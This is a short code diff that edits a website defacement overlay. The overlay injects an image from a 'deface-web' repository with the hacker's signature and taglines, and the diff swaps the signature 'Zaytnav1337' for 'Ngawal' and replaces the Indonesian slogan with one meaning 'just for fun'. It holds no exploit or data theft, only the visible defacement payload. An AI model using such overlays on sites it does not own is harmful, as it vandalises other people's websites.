@@ -17,8 +17,8 @@ overlay.innerHTML = `
     <img src="https://cdn.jsdelivr.net/gh/zaytnav1337/deface-web@main/deface.jpg" 
          style="max-width: 100%; height: 75vh; object-fit: cover;">
     <div style="margin-top: 30px;">
-      <h1 style="font-size:2.8vw;">By Zaytnav1337</h1>
-      <p style="color:red; font-size:18px;">Aku Hanya Sekedar Menguji Rasa Penasaranku<br></p>
+      <h1 style="font-size:2.8vw;">By Ngawal</h1>
+      <p style="color:red; font-size:18px;">Hanya Untuk Bersenang-Senang<br></p>
       <p style="color:white; font-size:16px;">+++ZI1337+++</p>
     </div>
   </div>
